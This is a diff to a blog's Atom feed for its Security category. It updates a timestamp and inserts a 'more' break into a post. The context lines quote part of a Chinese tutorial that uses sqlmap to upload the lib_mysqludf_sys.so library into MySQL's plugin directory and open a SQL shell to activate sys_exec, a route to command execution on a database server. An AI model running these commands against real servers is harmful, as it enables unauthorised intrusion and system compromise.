@@ -4,7 +4,7 @@
   <title><![CDATA[Category: Security | Ourren]]></title>
   <link href="http://blog.ourren.com/categories/security/atom.xml" rel="self"/>
   <link href="http://blog.ourren.com/"/>
-  <updated>2015-03-17T15:43:32-07:00</updated>
+  <updated>2015-03-17T15:52:44-07:00</updated>
   <id>http://blog.ourren.com/</id>
   <author>
     <name><![CDATA[ourren]]></name>
@@ -135,6 +135,15 @@ include($inc);
 <pre><code> python sqlmap.py -u 'http://xxxx' --file-write=/lib_mysqludf_sys.so 
  --file-dest=/usr/lib/mysql/plugin/
 </code></pre></li>
+</ol>
+
+
+<!--more-->
+
+
+<p></p>
+
+<ol>
 <li><p>激活存储过程「sys_exec」函数:</p>
 
 <pre><code> python sqlmap.py -u 'http://xxxx' --sql-shell
